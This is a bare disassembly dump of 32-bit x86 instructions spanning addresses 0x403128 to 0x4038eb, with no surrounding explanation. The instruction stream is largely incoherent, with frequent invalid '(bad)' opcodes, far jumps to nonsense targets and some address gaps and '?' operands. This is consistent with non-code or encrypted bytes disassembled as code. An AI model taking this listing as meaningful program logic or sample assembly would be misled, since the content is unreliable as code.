  403128:	dec    ebp
  403129:	into   
  40312a:	icebp  
  40312b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40312c:	ja     0x4030de
  40312e:	push   edx
  40312f:	xor    cl,al
  403131:	in     al,dx
  403132:	or     dh,dh
  403134:	mov    fs,WORD PTR [eax+ebp*1]
  403137:	push   edx
  403138:	pop    es
  403139:	int3   
  40313a:	arpl   WORD PTR [ecx+0x57],ax
  40313d:	lock ss cs push ecx
  403141:	push   ecx
  403142:	dec    esp
  403143:	sbb    BYTE PTR [edx+0x47b90321],dl
  403149:	cs mov edi,0xb64bab8d
  40314f:	add    al,0x39
  403151:	jle    0x403104
  403153:	dec    DWORD PTR [edx+0x7a]
  403156:	sti    
  403157:	xor    eax,0x2857d72a
  40315c:	mov    cl,0xd7
  40315e:	push   eax
  40315f:	push   0x2b31300d
  403164:	addr16 or bl,0x18
  403168:	aam    0x6f
  40316a:	adc    al,0xbd
  40316c:	arpl   WORD PTR [ecx+0x47710cd9],di
  403172:	mov    ds:0x206f7a24,eax
  403177:	aas    
  403178:	dec    edi
  403179:	and    esi,DWORD PTR [edx-0x304afb1e]
  40317f:	(bad)  
  403181:	xchg   esp,eax
  403182:	cmp    dl,dh
  403184:	pop    ss
  403185:	int3   
  403186:	lods   al,BYTE PTR ds:[esi]
  403187:	mov    esi,0x5c39e22b
  40318c:	ss je  0x403130
  40318f:	adc    edi,DWORD PTR [ebx+0x2c877919]
  403195:	sbb    eax,0xf4b26f35
  40319a:	ins    BYTE PTR es:[edi],dx
  40319b:	outs   dx,BYTE PTR ds:[esi]
  40319c:	out    dx,al
  40319d:	and    BYTE PTR [ebx],0x94
  4031a0:	into   
  4031a1:	adc    eax,0xf6b79693
  4031a6:	inc    dh
  4031a8:	rol    DWORD PTR [edx-0x711b63a8],0x4f
  4031af:	sar    DWORD PTR [edi+0x3906ce27],1
  4031b5:	dec    esi
  4031b6:	shl    ch,0xec
  4031b9:	mov    dl,0x8b
  4031bb:	push   esp
  4031bc:	gs loopne 0x4031b5
  4031bf:	xchg   DWORD PTR [edi],edi
  4031c1:	jne    0x4031cb
  4031c3:	rcr    DWORD PTR [ebx],1
  4031c5:	lods   eax,DWORD PTR ds:[esi]
  4031c6:	pop    es
  4031c7:	and    BYTE PTR [edx-0x77ba2f05],ah
  4031cd:	xor    DWORD PTR [ebx+0x72],edi
  4031d0:	shr    BYTE PTR [edi-0x61],1
  4031d3:	leave  
  4031d4:	xlat   BYTE PTR ds:[ebx]
  4031d5:	sti    
  4031d6:	mov    ebp,0x83ba0cb
  4031db:	or     eax,0x726ed8e3
  4031e0:	dec    edx
  4031e1:	test   eax,0xb51f3c3
  4031e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031e7:	mov    ah,0xa8
  4031e9:	push   edx
  4031ea:	pop    esp
  4031eb:	inc    edi
  4031ec:	icebp  
  4031ed:	loope  0x40322a
  4031ef:	cmc    
  4031f0:	and    eax,0xf251152d
  4031f5:	loop   0x40325f
  4031f7:	stos   BYTE PTR es:[edi],al
  4031f8:	add    al,0x77
  4031fa:	mov    bl,0xba
  4031fc:	sbb    dh,BYTE PTR [edx-0x42]
  4031ff:	sti    
  403200:	sbb    ebp,DWORD PTR [esi-0x4c]
  403203:	fisttp WORD PTR es:[ebx+0x25]
  403207:	xor    BYTE PTR [edx+0x2997ee9c],dh
  40320d:	and    eax,0x1ddad8f2
  403212:	pop    ss
  403213:	jl     0x403290
  403215:	shl    dh,cl
  403217:	repnz or esi,DWORD PTR [ecx-0x595121f2]
  40321e:	jp     0x403259
  403220:	jecxz  0x40327d
  403222:	inc    ebx
  403223:	popa   
  403224:	bound  edx,QWORD PTR [edx+0x1255f365]
  40322a:	sub    dh,BYTE PTR ds:0x9c166807
  403230:	mov    fs,WORD PTR [esi-0x3d92256c]
  403236:	mov    al,0xb5
  403238:	nop
  403239:	fnstenv [ebp-0x77]
  40323c:	push   es
  40323d:	inc    ebx
  40323e:	fld    TBYTE PTR [ecx+0x62]
  403241:	sub    edi,DWORD PTR [esi-0x423bc92a]
  403247:	or     edi,DWORD PTR cs:[ecx+0x46]
  40324b:	mov    BYTE PTR [edi+ebx*2-0x47d3c394],ah
  403252:	and    BYTE PTR [ebp+0x591f763],0x97
  403259:	mov    cl,0xd2
  40325b:	xchg   DWORD PTR gs:[edx],esp
  40325e:	xor    edi,esi
  403260:	lock push edi
  403262:	js     0x98848c62
  403268:	xchg   esi,eax
  403269:	retf   0x983d
  40326c:	push   0xa32121b1
  403271:	cli    
  403272:	pop    ebx
  403273:	mov    ebp,0xf0f222ad
  403278:	push   ebx
  403279:	push   0xffffffef
  40327b:	lods   al,BYTE PTR ds:[esi]
  40327c:	sub    BYTE PTR [edi+eax*8+0x4f],0xd0
  403281:	(bad)  
  403282:	enter  0xe2ac,0x7e
  403286:	pop    ds
  403287:	imul   edx,ebp,0xffffffc5
  40328a:	cmp    ah,BYTE PTR [edx]
  40328c:	or     edx,DWORD PTR [eax-0x4f19f4c6]
  403292:	mov    ah,0x74
  403294:	xchg   BYTE PTR [esi+0x63d965e],al
  40329a:	mov    ebx,0xaf5bd0ec
  40329f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032a0:	enter  0x608,0xff
  4032a4:	ds data16 mov bl,0x89
  4032a8:	pushf  
  4032a9:	std    
  4032aa:	rol    BYTE PTR [ecx-0x28],1
  4032ad:	ins    DWORD PTR es:[edi],dx
  4032ae:	int    0xf3
  4032b0:	js     0x4032b2
  4032b2:	scas   eax,DWORD PTR es:[edi]
  4032b3:	mov    cl,0x58
  4032b5:	add    cl,BYTE PTR [esi-0x7c]
  4032b8:	xlat   BYTE PTR ds:[ebx]
  4032b9:	in     eax,dx
  4032ba:	xchg   esi,eax
  4032bb:	sub    BYTE PTR [edi],ah
  4032bd:	cmc    
  4032be:	dec    si
  4032c0:	enter  0x8965,0x6b
  4032c4:	outs   dx,BYTE PTR ds:[esi]
  4032c5:	mov    ds:0x5a7ac17e,al
  4032ca:	imul   esi,DWORD PTR [esi+0x57da8e81],0xf1b07167
  4032d4:	dec    esp
  4032d5:	push   edx
  4032d6:	fisttp QWORD PTR [ecx-0x46e8728c]
  4032dc:	cwde   
  4032dd:	test   eax,0x58bfb398
  4032e2:	mov    cl,0x5d
  4032e4:	xchg   edx,eax
  4032e5:	(bad)  
  4032e6:	fsubr  QWORD PTR [edx]
  4032e8:	fwait
  4032e9:	rcl    edx,1
  4032eb:	gs mov ebx,edi
  4032ee:	push   edx
  4032ef:	aad    0x2a
  4032f1:	adc    dl,0x97
  4032f4:	repz (bad) 
  4032f6:	into   
  4032f7:	pop    eax
  4032f8:	or     eax,0x58c844ee
  4032fd:	pop    ds
  4032fe:	sbb    eax,0x737e8b77
  403303:	add    edi,ecx
  403305:	fld    st(5)
  403307:	inc    DWORD PTR [edi+esi*8+0xa187bec]
  40330e:	jns    0x40333a
  403310:	cwde   
  403311:	pop    edi
  403312:	ror    BYTE PTR [edi+0x387e3a37],0x9c
  403319:	outs   dx,BYTE PTR ds:[esi]
  40331a:	js     0x4032e9
  40331c:	jle    0x403388
  40331e:	push   ss
  40331f:	pop    eax
  403320:	pop    ecx
  403321:	inc    ebx
  403322:	icebp  
  403323:	test   DWORD PTR [edi],ecx
  403325:	hlt    
  403326:	fwait
  403327:	xchg   DWORD PTR [edi],ecx
  403329:	xchg   ebx,eax
  40332b:	mov    edi,0xacd3e7d3
  403330:	pop    ss
  403331:	psrld  mm0,QWORD PTR [edi-0x6]
  403335:	pop    ecx
  403336:	lods   eax,DWORD PTR ds:[esi]
  403337:	pop    ebp
  403338:	sub    BYTE PTR [edx+0x35],0x68
  40333c:	adc    edi,DWORD PTR [esi+0x29]
  40333f:	push   ds
  403340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403341:	jmp    0x20e60d35
  403346:	mov    ch,0x79
  403348:	cmp    BYTE PTR [ebx],bh
  40334a:	nop
  40334b:	sub    dh,0x16
  40334e:	test   al,0xa7
  403350:	test   DWORD PTR [ebx+ebp*1+0x5a8e4b94],edi
  403357:	mov    dl,0x17
  403359:	jge    0x40334b
  40335b:	pop    ss
  40335c:	daa    
  40335d:	les    esp,FWORD PTR [ebx-0x61]
  403360:	mov    ecx,0x82264a20
  403365:	add    BYTE PTR [esi],bl
  403367:	jg     0x4033a8
  403369:	dec    esi
  40336a:	mov    ebx,0x905a1bed
  40336f:	jns    0x4033e4
  403371:	xor    BYTE PTR [edi+0x3e97cf08],ch
  403377:	jge    0x4032fa
  403379:	mov    edi,0xfd94278e
  40337e:	test   eax,0x5fc36714
  403383:	push   edi
  403384:	mov    bl,0x47
  403386:	or     bh,ch
  403388:	and    al,0xdd
  40338a:	jmp    0xa61d:0x3b480568
  403391:	jle    0x403333
  403393:	fdivrp st(4),st
  403395:	mov    dh,0xa
  403397:	xlat   BYTE PTR ds:[ebx]
  403398:	inc    ebp
  403399:	fwait
  40339a:	pop    ds
  40339b:	pop    edi
  40339c:	ror    edi,cl
  40339e:	push   ebx
  40339f:	xchg   DWORD PTR ds:0xe6ebc2bb,edx
  4033a5:	dec    ebx
  4033a6:	(bad)  
  4033a8:	or     al,0x11
  4033aa:	fwait
  4033ab:	sbb    DWORD PTR [edx+0x6e7b6875],eax
  4033b1:	popf   
  4033b2:	imul   edi,DWORD PTR [eax-0x64],0x37e7c4a1
  4033b9:	ja     0x403355
  4033bb:	and    BYTE PTR [edx],ch
  4033bd:	in     al,dx
  4033be:	mov    al,0x10
  4033c0:	bound  ecx,QWORD PTR [ebx-0x2]
  4033c3:	dec    ebx
  4033c4:	pop    edi
  4033c5:	dec    ecx
  4033c6:	iret   
  4033c7:	sbb    dh,dl
  4033c9:	icebp  
  4033ca:	xchg   ecx,eax
  4033cb:	jnp    0x403430
  4033cd:	aam    0xc1
  4033cf:	pusha  
  4033d0:	push   ecx
  4033d1:	mov    ah,0xa
  4033d3:	dec    ebx
  4033d4:	outs   dx,DWORD PTR ds:[esi]
  4033d5:	inc    ebp
  4033d6:	dec    ebx
  4033d7:	jno    0x4033b1
  4033d9:	fadd   st(6),st
  4033db:	mov    ?,WORD PTR [ebx-0x2f]
  4033de:	add    eax,0xb6b1fdde
  4033e3:	push   edx
  4033e4:	call   0x24fd609e
  4033e9:	jmp    0x40342d
  4033eb:	mov    BYTE PTR [ecx-0x1e],bl
  4033ee:	test   eax,0x91f28138
  4033f3:	jbe    0x4033ce
  4033f5:	lahf   
  4033f6:	aam    0x2c
  4033f8:	jbe    0x40345c
  4033fa:	aaa    
  4033fb:	int    0xe5
  4033fd:	out    dx,al
  4033fe:	cli    
  4033ff:	sar    DWORD PTR [ecx+edi*4],cl
  403402:	(bad)  
  403403:	sbb    DWORD PTR [eax-0x7f],edx
  403406:	push   ebx
  403407:	sbb    ebp,DWORD PTR [esi+0x76]
  40340a:	mov    esp,0x210eadf6
  40340f:	dec    bl
  403411:	mov    edx,DWORD PTR [eax+0x14a8d81e]
  403417:	in     al,0x8a
  403419:	call   0x98e1:0x803eff7d
  403420:	adc    ch,BYTE PTR [ecx]
  403422:	sub    cl,BYTE PTR [ebp-0x24]
  403425:	inc    ebp
  403426:	cmc    
  403427:	cmc    
  403428:	rcr    bh,1
  40342a:	xchg   DWORD PTR [ebx+0x566e98df],esi
  403430:	jno    0x403419
  403432:	sbb    DWORD PTR [ebx+0x41],eax
  403435:	cmc    
  403436:	icebp  
  403437:	or     DWORD PTR ds:0xcbd1e720,ecx
  40343d:	icebp  
  40343e:	or     esi,DWORD PTR [eax+ebx*8+0x1d]
  403442:	mov    ecx,0x96059450
  403447:	xor    al,0x4
  403449:	loope  0x4034ca
  40344b:	jbe    0x403495
  40344d:	addr16 adc al,0xf6
  403450:	cmp    bl,BYTE PTR [eax+0x44bf31c]
  403456:	daa    
  403457:	icebp  
  403458:	jb     0x4033dd
  40345a:	mov    eax,?
  40345c:	add    eax,DWORD PTR [ebx-0x17]
  40345f:	lods   al,BYTE PTR ds:[esi]
  403460:	test   BYTE PTR [ebx+0x22c0940e],ch
  403466:	clc    
  403467:	out    dx,al
  403468:	xor    esi,edx
  40346a:	addr16 cmc 
  40346c:	stos   BYTE PTR es:[edi],al
  40346d:	in     al,dx
  40346e:	lods   al,BYTE PTR ds:[esi]
  40346f:	mov    bl,0x3e
  403471:	pop    eax
  403472:	into   
  403473:	and    DWORD PTR [esi+edx*4+0x1c5b6358],esi
  40347a:	stos   BYTE PTR es:[edi],al
  40347b:	(bad)  
  40347c:	pop    esi
  40347d:	mov    edi,0x67cc3561
  403482:	ret    
  403483:	push   0x42efc552
  403488:	xchg   bl,bl
  40348a:	or     BYTE PTR [ebp+0x2e],dh
  40348d:	je     0x4034cf
  40348f:	lock or edi,DWORD PTR [edi-0x4e]
  403493:	jb     0x4034f8
  403495:	pop    ebx
  403496:	mov    ebx,0x9b7efbf7
  40349b:	pop    edx
  40349c:	sbb    dl,bh
  40349e:	inc    esi
  40349f:	gs push edx
  4034a1:	pop    es
  4034a2:	aaa    
  4034a3:	or     BYTE PTR [edi],ah
  4034a5:	out    dx,al
  4034a6:	xchg   edx,eax
  4034a7:	fs jne 0x403501
  4034aa:	push   ebp
  4034ab:	or     BYTE PTR [ecx-0x35],ah
  4034ae:	sub    ah,BYTE PTR [ebp-0x2a]
  4034b1:	or     bl,BYTE PTR [ebp-0x3f]
  4034b4:	jno    0x4034c8
  4034b6:	sub    esi,esi
  4034b8:	xchg   edi,eax
  4034b9:	int    0x52
  4034bb:	pop    edi
  4034bd:	outs   dx,BYTE PTR ds:[esi]
  4034be:	cmc    
  4034bf:	sub    esi,DWORD PTR [eax+0x1f3c23b5]
  4034c5:	rol    BYTE PTR [esi],1
  4034c7:	ins    BYTE PTR es:[edi],dx
  4034c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034c9:	sub    eax,0x8d90bb95
  4034ce:	adc    BYTE PTR [edi],0xd1
  4034d1:	loop   0x4034e0
  4034d3:	mov    gs,edx
  4034d5:	pop    ds
  4034d6:	mov    esi,0xdc5bd7d9
  4034db:	jmp    0xcf6c3cb2
  4034e0:	aas    
  4034e1:	jp     0x403549
  4034e3:	mov    ch,BYTE PTR [ecx+0x67]
  4034e6:	stc    
  4034e7:	test   eax,0x6c8315dc
  4034ec:	sub    esi,DWORD PTR [edx]
  4034ee:	in     al,dx
  4034ef:	loop   0x4034b2
  4034f1:	cmp    BYTE PTR ds:0x7b0a8fc1,0xc5
  4034f8:	and    ecx,edi
  4034fa:	push   edx
  4034fb:	push   ecx
  4034fc:	das    
  4034fd:	nop
  4034fe:	ss mov dh,0x20
  403501:	sub    al,0x9b
  403503:	sub    eax,0xd9997120
  403508:	inc    edi
  403509:	fwait
  40350a:	ret    0x868b
  40350d:	mov    bh,0x18
  40350f:	dec    edx
  403510:	loope  0x40357f
  403512:	inc    edx
  403513:	sar    DWORD PTR [ebx-0xdcc6f60],0x7f
  40351a:	(bad)
  40351d:	in     eax,0xf
  40351f:	mov    dh,0x7
  403521:	aaa    
  403522:	push   ebp
  403523:	call   0xa90c:0xa9318eeb
  40352a:	(bad)  
  40352b:	xor    al,0x5
  40352d:	stc    
  40352e:	into   
  40352f:	das    
  403530:	adc    eax,0x410c615a
  403535:	popa   
  403536:	dec    ebx
  403537:	fld    DWORD PTR [ecx-0x720c6126]
  40353d:	sbb    BYTE PTR [ebx],ah
  40353f:	ins    DWORD PTR es:[edi],dx
  403540:	inc    eax
  403541:	repnz popf 
  403543:	adc    DWORD PTR [bx+si],eax
  403546:	sbb    eax,0x93b0ee8c
  40354b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40354c:	ret    
  40354d:	cmp    DWORD PTR [ebx],ecx
  40354f:	mov    bl,0xc8
  403551:	mov    ch,0x36
  403553:	xor    dh,0x2a
  403556:	add    ch,cl
  403558:	cmp    esp,DWORD PTR ds:[ebx+0x51]
  40355c:	stos   DWORD PTR es:[edi],eax
  40355d:	pop    edx
  40355e:	xor    eax,0xee8128a4
  403563:	imul   esp,ebp,0x7
  403566:	fld    TBYTE PTR [edx]
  403568:	pop    ebx
  403569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40356a:	adc    al,0x86
  40356c:	int    0xeb
  40356e:	inc    esi
  40356f:	sub    eax,0xbadee1fd
  403574:	mov    cl,0x28
  403576:	inc    ebp
  403577:	fwait
  403578:	xor    DWORD PTR [esi],ecx
  40357a:	mov    cl,BYTE PTR [edi+0x6eb97fe3]
  403580:	aad    0x2b
  403582:	int3   
  403583:	push   edi
  403584:	cli    
  403585:	adc    cl,al
  403587:	cdq    
  403588:	and    esi,DWORD PTR [eax-0x55]
  40358b:	imul   esp,DWORD PTR ds:0x694d368d,0xffffff94
  403592:	fs sti 
  403594:	ss mov ebx,0xd0b538cc
  40359a:	mov    dh,0x61
  40359c:	push   edx
  40359d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40359e:	outs   dx,BYTE PTR ds:[esi]
  40359f:	loop   0x403531
  4035a1:	mov    ah,BYTE PTR [esi-0x55fe412d]
  4035a7:	lahf   
  4035a8:	std    
  4035a9:	ja     0x403560
  4035ab:	mov    al,0x3a
  4035ad:	ret    0xcd06
  4035b0:	push   ebx
  4035b1:	jl     0x4035e2
  4035b3:	mov    bh,0xef
  4035b5:	jae    0x40360a
  4035b7:	mov    ebx,0xe5a6eac2
  4035bc:	lods   eax,DWORD PTR ds:[esi]
  4035bd:	test   DWORD PTR [ebx-0x43],edi
  4035c0:	push   ecx
  4035c1:	mov    ch,0x10
  4035c3:	mov    ebp,0x2da39aad
  4035c8:	and    al,bl
  4035ca:	dec    ecx
  4035cb:	jb     0x403578
  4035cd:	jp     0x4035b5
  4035cf:	mov    WORD PTR ds:0x1aaa16c,cs
  4035d5:	cld    
  4035d6:	outs   dx,DWORD PTR ds:[esi]
  4035d7:	fild   DWORD PTR [esp+edi*4]
  4035da:	sbb    DWORD PTR ds:0x404af7ea,0xffffffaf
  4035e1:	pusha  
  4035e2:	popa   
  4035e3:	test   DWORD PTR [ebx+0x6decee0e],esi
  4035e9:	stos   DWORD PTR es:[edi],eax
  4035ea:	arpl   WORD PTR [edx],bx
  4035ec:	lds    edi,FWORD PTR [ebx+0x607d40f2]
  4035f2:	test   eax,0x9656679d
  4035f7:	inc    eax
  4035f8:	cwde   
  4035f9:	fistp  WORD PTR [ebx+0x35d18156]
  4035ff:	ins    DWORD PTR es:[edi],dx
  403600:	mov    edx,0x2434199d
  403605:	sahf   
  403606:	add    al,0xde
  403608:	xor    BYTE PTR [ecx+esi*8+0x61bed6c3],dh
  40360f:	jnp    0x403650
  403611:	jbe    0x4035d8
  403613:	xchg   esp,eax
  403614:	mov    ebp,gs
  403616:	inc    edx
  403617:	mov    dl,0x85
  403619:	jae    0x403636
  40361b:	push   ecx
  40361c:	xchg   BYTE PTR [ecx+0x28],ah
  40361f:	fdiv   QWORD PTR [esi+0x50296b99]
  403625:	jbe    0x403631
  403627:	imul   ebp,DWORD PTR gs:[eax-0x31],0x385ffefc
  40362f:	adc    edi,edx
  403631:	cmp    dh,dh
  403633:	cmp    BYTE PTR [ebx+0x4b],0x86
  403637:	into   
  403638:	cwde   
  403639:	imul   edi,DWORD PTR [edi-0x1d],0x8c5bdb13
  403640:	(bad)  
  403641:	in     al,dx
  403642:	retf   0xfcdb
  403645:	pop    esi
  403646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403647:	cmp    DWORD PTR [ebp-0x7ebd8627],esp
  40364d:	ret    0x34f2
  403650:	dec    esp
  403651:	test   eax,0xf6378c12
  403656:	xchg   DWORD PTR [esi+0x5ee580d],esp
  40365c:	test   BYTE PTR [ebp*8+0x447a454],bh
  403663:	and    al,0xcd
  403665:	pushf  
  403666:	ja     0x40365d
  403668:	or     DWORD PTR [edx-0x62],eax
  40366b:	xchg   edx,eax
  40366c:	(bad)  
  40366d:	adc    BYTE PTR [edi],dl
  40366f:	nop
  403670:	cmp    BYTE PTR [ebp-0x75],bl
  403673:	sub    BYTE PTR [edx+0x2d718f2b],0xb1
  40367a:	in     eax,dx
  40367b:	dec    ecx
  40367c:	mov    bh,0x43
  40367e:	push   edx
  40367f:	neg    BYTE PTR [ebx]
  403681:	mov    bl,dh
  403683:	mov    al,ds:0x8fe32f1b
  403688:	dec    eax
  403689:	sub    esp,ebx
  40368b:	iret   
  40368c:	inc    eax
  40368d:	into   
  40368e:	mov    cl,0x85
  403690:	aad    0x2
  403692:	idiv   BYTE PTR [esi+0x19]
  403695:	mov    ch,0xc9
  403697:	scas   al,BYTE PTR es:[edi]
  403698:	mov    esi,0x6bc35a73
  40369d:	(bad)  
  40369e:	std    
  40369f:	lock (bad) [ecx]
  4036a2:	mov    dh,0x34
  4036a4:	dec    edi
  4036a5:	mov    al,0x1d
  4036a7:	push   esp
  4036a8:	jnp    0x40365b
  4036aa:	mov    ds:0x5c7cf041,eax
  4036af:	les    edx,FWORD PTR [ebx-0x1a5d5bac]
  4036b5:	pop    ss
  4036b6:	sub    BYTE PTR [ecx],dh
  4036b8:	lock out 0x98,al
  4036bb:	jb     0x40369c
  4036bd:	cmp    eax,0x24917276
  4036c2:	pop    ebp
  4036c3:	jge    0x4036ac
  4036c5:	cmp    esp,DWORD PTR ds:0xf9cfe564
  4036cb:	xchg   ecx,eax
  4036cc:	or     BYTE PTR [edx+eiz*4],bh
  4036cf:	inc    esp
  4036d0:	sti    
  4036d1:	leave  
  4036d2:	shl    BYTE PTR [ecx],1
  4036d4:	inc    ebx
  4036d5:	stos   BYTE PTR es:[edi],al
  4036d6:	(bad)  
  4036d7:	fnstcw WORD PTR [eax+0x21]
  4036da:	mov    ah,0xf
  4036dc:	xor    bh,BYTE PTR [edi]
  4036de:	and    al,0xf6
  4036e0:	add    dl,0xe0
  4036e3:	frstor [edx+0x5025e40c]
  4036e9:	push   esi
  4036ea:	jne    0x4036ed
  4036ec:	add    esi,DWORD PTR [esi+0x2d]
  4036ef:	(bad)  
  4036f0:	lds    esp,FWORD PTR [edi]
  4036f2:	shr    ebx,1
  4036f4:	push   eax
  4036f5:	in     eax,dx
  4036f6:	loopne 0x4036ef
  4036f8:	xor    edx,DWORD PTR [ebp-0x55]
  4036fb:	rol    BYTE PTR [ebp+0x8],cl
  4036fe:	stc    
  4036ff:	mov    BYTE PTR [ecx-0x21ad4885],cl
  403705:	or     esp,esp
  403707:	je     0x403719
  403709:	call   0xe7cc:0x3193f112
  403710:	idiv   esp
  403712:	loop   0x403745
  403714:	xchg   ecx,eax
  403715:	scas   al,BYTE PTR es:[edi]
  403716:	dec    DWORD PTR [esp+edi*1+0x32]
  40371a:	popf   
  40371b:	les    edx,FWORD PTR [ebp-0x5e]
  40371e:	inc    ecx
  40371f:	inc    esp
  403720:	cmp    ebx,DWORD PTR [ecx+eax*2+0x582078b0]
  403727:	add    ah,al
  403729:	pop    ecx
  40372a:	imul   eax,eax,0x5a0ae2d1
  403730:	retf   
  403731:	repz lea ecx,[eax]
  403734:	jne    0x40377c
  403736:	sbb    BYTE PTR [edx+esi*2-0x56],cl
  40373a:	fisubr DWORD PTR [edx+eax*1]
  40373d:	cmp    BYTE PTR [edx-0x3c913648],0xf3
  403744:	shr    ebp,cl
  403746:	je     0x403714
  403748:	out    dx,al
  403749:	retf   0xe779
  40374c:	sub    eax,0x47f3934b
  403751:	dec    edx
  403752:	scas   al,BYTE PTR es:[edi]
  403753:	loope  0x4037a1
  403755:	xchg   ebp,eax
  403756:	rcr    DWORD PTR ds:0x7e7eaefb,1
  40375c:	pusha  
  40375d:	or     ch,BYTE PTR [ecx+0x5b]
  403760:	inc    edi
  403761:	(bad)  
  403762:	ficomp WORD PTR [edi+0x7a]
  403765:	push   esi
  403766:	fsub   DWORD PTR [eax+0x7a]
  403769:	jmp    0xa98f:0x497beeb5
  403770:	push   ss
  403771:	pop    ecx
  403772:	cld    
  403773:	lds    edi,FWORD PTR [eax+0x2d]
  403776:	lods   al,BYTE PTR ds:[esi]
  403777:	push   edi
  403778:	inc    eax
  403779:	retf   0xad50
  40377c:	nop
  40377d:	outs   dx,DWORD PTR ds:[esi]
  40377e:	pop    es
  40377f:	out    dx,al
  403780:	inc    edi
  403781:	aad    0xd6
  403783:	dec    esi
  403784:	xor    DWORD PTR [edi+0x67],edi
  403787:	inc    eax
  403788:	int3   
  403789:	cld    
  40378a:	lock aaa 
  40378c:	stos   BYTE PTR es:[edi],al
  40378d:	fwait
  40378e:	data16 rcr BYTE PTR [esi+0x6],0x68
  403793:	adc    al,0xab
  403795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403796:	pop    ebx
  403797:	mov    esp,0xb70512ca
  40379c:	outs   dx,DWORD PTR ds:[esi]
  40379d:	repnz sbb eax,0x566508fd
  4037a3:	(bad)  
  4037a4:	xchg   ebp,eax
  4037a5:	jae    0x4037da
  4037a7:	inc    BYTE PTR [edx-0x31e92f2e]
  4037ad:	push   ebx
  4037ae:	out    0x33,eax
  4037b0:	les    ecx,FWORD PTR [edx-0x24]
  4037b3:	clc    
  4037b4:	sbb    al,0x34
  4037b6:	sar    eax,cl
  4037b8:	jns    0x403743
  4037ba:	dec    ebp
  4037bb:	push   ebx
  4037bc:	jmp    0x5ded629
  4037c1:	pop    edx
  4037c2:	mov    eax,ss:0x1eb82094
  4037c8:	rcl    DWORD PTR [eax],cl
  4037ca:	inc    ebp
  4037cb:	cmc    
  4037cc:	mov    DWORD PTR [edi+0x452be4e2],ebx
  4037d2:	ror    ebx,cl
  4037d4:	inc    edi
  4037d5:	in     al,dx
  4037d6:	lahf   
  4037d7:	jp     0x403798
  4037d9:	(bad)  
  4037da:	enter  0x7971,0x6d
  4037de:	dec    esp
  4037df:	dec    edx
  4037e0:	ret    
  4037e1:	out    0xc1,eax
  4037e3:	retf   0x99ba
  4037e6:	pop    esp
  4037e7:	inc    edx
  4037e8:	ja     0x4037de
  4037ea:	push   0x7337ee67
  4037ef:	or     esp,DWORD PTR [ecx+0x5c]
  4037f2:	inc    esi
  4037f3:	shl    DWORD PTR [eax+edx*2+0x17],0x4d
  4037f8:	and    eax,ecx
  4037fa:	mov    ebx,0xf688473e
  4037ff:	or     BYTE PTR [edx],ah
  403801:	dec    ebp
  403802:	mov    eax,ds:0x44bdc99d
  403807:	std    
  403808:	pop    eax
  403809:	jne    0x4037f5
  40380b:	mov    edx,0x62c7c035
  403810:	div    DWORD PTR [eax-0x1e]
  403813:	mov    ecx,0x888525dc
  403818:	push   ss
  403819:	lock dec edx
  40381b:	mov    ds:0x45803f6d,al
  403820:	adc    BYTE PTR [eax+0x13664b54],ch
  403826:	out    0xdd,eax
  403828:	sub    eax,0x7b89df57
  40382d:	add    ebx,edi
  40382f:	jle    0x403891
  403831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403832:	in     al,0xc7
  403834:	mov    ds:0xbeeb9624,eax
  403839:	repz loope 0x40387c
  40383c:	in     al,0xc8
  40383e:	add    DWORD PTR cs:[ecx+0x5e],ecx
  403842:	imul   eax,edx,0x31
  403845:	ja     0x40380c
  403847:	ins    BYTE PTR es:[edi],dx
  403848:	jno    0x403833
  40384a:	loop   0x4037db
  40384c:	dec    ebp
  40384d:	xchg   edx,esi
  40384f:	or     DWORD PTR [ebx],ecx
  403851:	les    esi,FWORD PTR [ebx]
  403853:	mov    ds,ebp
  403855:	imul   DWORD PTR [esi-0x71d1ac6e]
  40385b:	mov    ebp,0x27597544
  403860:	loope  0x4038c1
  403862:	jne    0x4038de
  403864:	add    al,0xd8
  403866:	es scas al,BYTE PTR es:[edi]
  403868:	jp     0x4038a3
  40386a:	adc    al,0x25
  40386c:	inc    eax
  40386d:	in     al,dx
  40386e:	mov    ebx,0x927b66ac
  403873:	je     0x403810
  403875:	addr16 hlt 
  403877:	(bad)  
  403878:	call   0x5a4c:0x7fcd7007
  40387f:	push   DWORD PTR [edx]
  403881:	dec    ebx
  403882:	pop    ss
  403883:	add    ah,ch
  403885:	jecxz  0x403831
  403887:	sub    esp,DWORD PTR ds:0x7b197f1f
  40388d:	xchg   ebx,eax
  40388e:	stos   BYTE PTR es:[edi],al
  40388f:	cmp    al,0x10
  403891:	hlt    
  403892:	fadd   st(5),st
  403894:	(bad)  
  403895:	in     al,dx
  403896:	call   0xbc5b:0xe89aba64
  40389d:	jg     0x403821
  40389f:	sti    
  4038a0:	stc    
  4038a1:	mov    bh,0xc0
  4038a3:	scas   eax,DWORD PTR es:[edi]
  4038a4:	lahf   
  4038a5:	jbe    0x40389e
  4038a7:	nop
  4038a8:	ja     0x40385c
  4038aa:	nop
  4038ab:	mov    ah,0x76
  4038ad:	fmul   st(2),st
  4038af:	inc    esi
  4038b0:	mov    eax,0x20ed2afe
  4038b5:	clc    
  4038b6:	add    DWORD PTR ds:0x771dd2e2,eax
  4038bc:	gs push 0x96fdc94e
  4038c2:	pop    edi
  4038c3:	push   ebx
  4038c4:	dec    eax
  4038c5:	fstp   DWORD PTR [ebx-0x7c]
  4038c8:	inc    edi
  4038c9:	addr16 push ebx
  4038cb:	rol    ah,0x69
  4038ce:	cmp    al,0x6f
  4038d0:	leave  
  4038d1:	jno    0x40394c
  4038d3:	imul   edi,DWORD PTR [ecx+0x2f],0xffffffb3
  4038d7:	xchg   edx,eax
  4038d8:	aam    0xfa
  4038da:	push   cs
  4038db:	jae    0x40390a
  4038dd:	pop    edi
  4038de:	or     ebx,DWORD PTR [edi+edi*2]
  4038e1:	and    BYTE PTR [eax],bl
  4038e3:	xchg   esi,eax
  4038e4:	xchg   DWORD PTR [esi+0x754a48e],ebx
  4038ea:	into   
  4038eb:	outs   dx,BYTE PTR ds:[esi]
